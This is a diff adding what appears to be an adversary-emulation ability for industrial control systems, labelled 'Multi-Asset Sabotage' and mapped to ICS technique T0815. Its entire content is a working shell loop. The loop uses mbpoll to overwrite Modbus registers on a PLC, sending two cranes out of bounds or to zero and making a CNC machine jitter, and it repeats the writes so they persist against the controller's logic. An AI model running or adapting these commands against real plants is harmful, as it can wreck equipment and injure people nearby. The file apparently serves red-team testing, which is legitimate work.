@@ -1,0 +1,28 @@
+- id: 999-nexus-coordinated-logic-injection
+  name: Nexus OT - Multi-Asset Sabotage
+  description: Overwrite X/Z coordinates for Cranes 0, 1, and CNC (Machine 5)
+  tactic: impact
+  technique:
+    attack_id: T0815
+    name: ICS Data Injection
+  platforms:
+    linux:
+      sh:
+        command: |
+          # Targeting the PLC IP: 192.168.1.223
+          # We use a loop to ensure the injection persists against PLC logic cycles
+          for i in {1..50}; do
+            # 1. Sabotage Crane 0 (Reg 100, 101) - Send to Max Out of Bounds
+            mbpoll -m tcp -a 1 -t 4 -r 100 -1 192.168.1.223 9999 &
+            mbpoll -m tcp -a 1 -t 4 -r 101 -1 192.168.1.223 9999 &
+            
+            # 2. Sabotage Crane 1 (Reg 102, 103) - Send to Negative/Zero
+            mbpoll -m tcp -a 1 -t 4 -r 102 -1 192.168.1.223 0 &
+            mbpoll -m tcp -a 1 -t 4 -r 103 -1 192.168.1.223 0 &
+            
+            # 3. Sabotage CNC Machine 5 (Reg 104, 105) - Rapid Jitter
+            mbpoll -m tcp -a 1 -t 4 -r 104 -1 192.168.1.223 5000 &
+            mbpoll -m tcp -a 1 -t 4 -r 105 -1 192.168.1.223 5000 &
+            
+            sleep 0.1
+          done
